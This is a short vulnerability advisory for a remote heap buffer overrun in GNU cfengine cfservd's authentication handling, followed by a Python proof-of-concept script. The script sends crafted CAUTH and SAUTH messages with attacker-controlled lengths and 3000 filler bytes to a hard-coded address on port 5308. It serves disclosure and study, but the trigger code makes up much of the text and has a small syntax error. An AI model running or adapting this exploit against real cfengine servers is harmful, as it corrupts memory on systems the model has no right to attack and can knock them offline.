source: http://www.securityfocus.com/bid/10899/info

GNU cfengine cfservd is reported prone to a remote heap-based buffer overrun vulnerability. The vulnerability presents itself in the cfengine cfservd AuthenticationDialogue() function.

The issue exists due to a lack of sufficient boundary checks performed on challenge data that is received from a client. 

Because the size of the buffer, the size of data copied in a memcpy() operation, and the data copied are all controlled by the attacker, a remote attacker may likely exploit this condition to corrupt in-line heap based memory management data. 

cfservd employs an IP based access control method. This access control must be bypassed prior to exploitation. This may hinder exploitation attempts.

This vulnerability is reported to affect versions 2.0.0 to 2.1.7p1 of cfengine cfservd.

import struct
import socket
import time

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.1',5308)

# CAUTH command
p = 'k' # status
p += '0000023' # len
p += 'CAUTH ' # command
p += 'HARE KRISHNA HARE'
print 'sending CAUTH command...'
s.send(p)
# SAUTH command
p = 'k' # status
p += '0003000' # len
p += 'SAUTH ' # command
p += 'n' # iscrypt
p += '00000010 ' # crypt_len
p += '00001000' # nonce_len
p += 'X' * 3000
print 'sending SAUTH command...'
s.send(p)

a = s.recv(4096)
print a
